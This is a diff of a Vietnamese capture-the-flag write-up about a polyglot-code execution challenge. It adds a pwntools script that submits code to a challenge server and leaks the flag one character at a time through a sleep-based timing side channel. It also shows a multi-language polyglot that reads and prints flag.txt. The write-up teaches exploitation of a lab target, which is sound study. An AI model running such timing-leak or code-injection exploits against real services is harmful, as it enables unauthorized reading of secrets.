@@ -1376,7 +1376,6 @@ if __name__ == "__main__":
     main()
 
 ```
-
 ### 5. Multi...
 
 ---
@@ -1395,6 +1394,60 @@ import time
 flag = open('flag.txt', 'r').read()
 time.sleep(ord(flag[{i}]) / 10)
 ```
+
 Máy chủ sẽ chạy nó, trong khi nó vẫn thỏa mãn yêu cầu của sever và cũng leak cho chúng ta thông tin thêm về flag.
 
-Từ đó, ta gửi yêu cầu nhiều lần lêmạng)
+Từ đó, ta gửi yêu cầu nhiều lần lên lên máy chủ, mỗi lần đọc từng ký tự của flag khi đó chương trình sẽ tạm dừng chương trình một khoảng thời gian đúng bằng (ord(flag) / 10) nên ta tính toán khoảng thời gian chênh lệch là ta có flag ( trong đoạng code có bị trừ đi cho 2 là do một vài yếu tố mội trường như tốc độ mang, máy tính ảnh hưởng tới thời gian)
+
+```py
+
+import time
+from base64 import *
+from pwn import *
+
+def main() -> None:
+
+    flag = ""
+
+    for i in range(100):
+
+        code = f"""
+import time
+flag = open('flag.txt', 'r').read()
+time.sleep(ord(flag[{i}]) / 10)
+"""
+        s = remote("94.237.63.93", 38070)
+
+        s.recvuntil(b'Enter the program of many languages: ')
+        start = time.time()
+        s.sendline(b64encode(code.encode()))
+        s.recvuntil(b'[+] Completed. Checking output')
+        end = time.time()
+
+        flag += chr(int((end - start)* 10) - 2)
+        print(flag)
+
+        s.close()
+
+        if flag[-1] == "}":
+            break
+
+if __name__ == "__main__":
+    main()
+
+```
+
+
+> Another way: Ngôn ngữ của chúa
+
+
+```py
+#include/*
+#<?php eval('echo file_get_contents("flag.txt", true);')?>
+q="""*/<stdio.h>
+int main() {char s[500];fgets(s, 500, fopen((const char[]){'f','l','a','g','.','t','x','t','\x00'}, (const char[]){'r', '\x00'})); {puts(s);}if(1);
+	else	{}} /*=;
+open(my $file, 'flag.txt');print(<$file>)#";print(puts File.read('flag.txt'));#""";print(open('flag.txt').read())#*/
+```
+
+Nếu bạn đã quá mệt mỏi vì mấy bài brute force 2 ^ 32 thì có thể sử dụng cách này (copy code trên mạng)
